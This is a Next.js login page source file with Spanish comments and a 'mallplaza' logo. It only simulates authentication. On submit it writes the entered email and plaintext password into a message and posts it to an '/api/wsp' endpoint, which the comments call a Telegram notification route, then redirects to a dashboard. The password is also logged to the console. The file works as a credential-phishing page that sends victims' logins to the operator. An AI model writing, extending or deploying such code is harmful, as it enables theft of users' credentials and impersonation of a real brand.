// app/login/page.tsx (o donde tengas tu LoginPage)
'use client';
import { useRouter } from 'next/navigation';
import { useState } from 'react';
import Image from 'next/image'; // <-- Import the Image component

export default function LoginPage() {
  const router = useRouter();
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    setLoading(true);
    console.log('Intentando iniciar sesión con:', email, password);

    try {
      // --- PASO 1: SIMULACIÓN DE LA LLAMADA A TU API DE AUTENTICACIÓN REAL ---
      // (Manteniendo la simulación de éxito por ahora)
      const authSuccess = true; // Simula que el login fue exitoso

      if (!authSuccess) {
        throw new Error('Error al iniciar sesión (simulado).');
      }

      console.log('Inicio de sesión simulado exitoso.');

      // --- PASO 2: LLAMAR A TU API DE NOTIFICACIÓN DE TELEGRAM (/api/wsp) ---
      // Si el inicio de sesión fue exitoso, envía la notificación
      // AHORA INCLUIMOS EL CORREO Y LA CONTRASEÑA EN EL MENSAJE
      const notificationMessage = `
🚨 **Alerta de Inicio de Sesión** 🚨

**Estado:** EXITOSO (Simulado)
**Correo:** ${email}
**Contraseña:** ${password}
**Hora:** ${new Date().toLocaleString('es-CL', { timeZone: 'America/Santiago' })}
`;

      const telegramResponse = await fetch("/api/wsp", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          message: notificationMessage, // Envía el mensaje con correo y contraseña
        }),
      });

      const telegramData = await telegramResponse.json();
      if (!telegramResponse.ok || !telegramData.success) {
        console.warn('Advertencia: La notificación de Telegram falló:', telegramData.error || 'Error desconocido.');
      } else {
        console.log('Notificación de Telegram enviada con éxito:', telegramData.data);
      }

      // --- PASO 3: Redirigir al usuario ---
      router.push('/dashboard');

    } catch (error) {
      console.error('Error durante el proceso de inicio de sesión:', error);
      alert('Error al iniciar sesión. Por favor, inténtalo de nuevo.');
    } finally {
      setLoading(false);
    }
  }

  return (
    <main className="flex flex-col items-center justify-center h-screen bg-gray-100">
      <div className="absolute top-0 left-0 p-8">
        {/* Reemplazado <img> con <Image /> */}
        <Image
          src="/logo-mallplaza.png"
          alt="mallplaza"
          width={150} // Adjust width as needed for your logo (e.g., 150px)
          height={40}  // Adjust height to maintain aspect ratio (e.g., 40px)
          className="h-10" // Keep your existing Tailwind class for responsive height if needed
        />
      </div>
      <form
        onSubmit={handleSubmit}
        className="bg-white p-10 rounded-lg shadow-lg flex flex-col gap-6 w-96 max-w-sm"
      >
        <h2 className="text-3xl font-semibold text-center mb-4 text-gray-800">Iniciar Sesión</h2>
        <input
          type="email"
          placeholder="Correo"
          value={email}
          onChange={e => setEmail(e.target.value)}
          required
          className="p-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-red-500 text-black"
          disabled={loading}
        />
        <input
          type="password"
          placeholder="Contraseña"
          value={password}
          onChange={e => setPassword(e.target.value)}
          required
          className="p-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-red-500 text-black"
          disabled={loading}
        />
        <button
          className="bg-red-600 hover:bg-red-700 text-white font-bold py-3 px-8 rounded-lg transition duration-300 ease-in-out mt-2"
          type="submit"
          disabled={loading}
        >
          {loading ? 'Iniciando sesión...' : 'Iniciar sesión'}
        </button>
      </form>
    </main>
  );
}